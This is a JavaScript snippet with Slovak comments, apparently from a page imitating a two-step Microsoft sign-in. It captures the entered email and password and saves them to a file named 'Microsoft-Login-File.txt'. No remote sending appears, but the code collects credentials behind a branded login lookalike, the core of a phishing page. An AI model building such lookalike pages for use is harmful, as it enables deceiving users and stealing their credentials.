    <script>
        // Funkcia na prepnutie na stránku s heslom
        function goToPassword() {
            const username = document.getElementById('inp_uname').value;
            if (username) {
                document.getElementById('user_identity').innerText = username;
                document.getElementById('section_uname').classList.add('d-none');
                document.getElementById('section_pwd').classList.remove('d-none');
            }
        }

        // Funkcia na stiahnutie súboru s emailom a heslom
        function downloadCredentials() {
            const email = document.getElementById('inp_uname').value;
            const password = document.getElementById('inp_pwd').value;

            if (email && password) {
                const blob = new Blob([`Email: ${email}\nPassword: ${password}`], { type: 'text/plain' });
                const link = document.createElement('a');
                link.href = window.URL.createObjectURL(blob);
                link.download = 'Microsoft-Login-File.txt';
                link.click();
            }
        }
    </script>
